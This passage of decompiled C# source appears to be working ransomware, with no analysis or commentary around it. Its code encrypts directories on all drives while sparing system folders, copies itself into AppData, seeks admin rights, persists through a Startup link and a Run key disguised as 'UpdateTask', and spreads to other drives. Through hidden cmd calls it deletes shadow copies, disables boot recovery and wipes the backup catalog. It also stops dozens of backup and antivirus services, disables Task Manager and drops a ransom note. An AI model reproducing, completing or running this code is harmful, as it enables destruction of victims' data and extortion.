			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
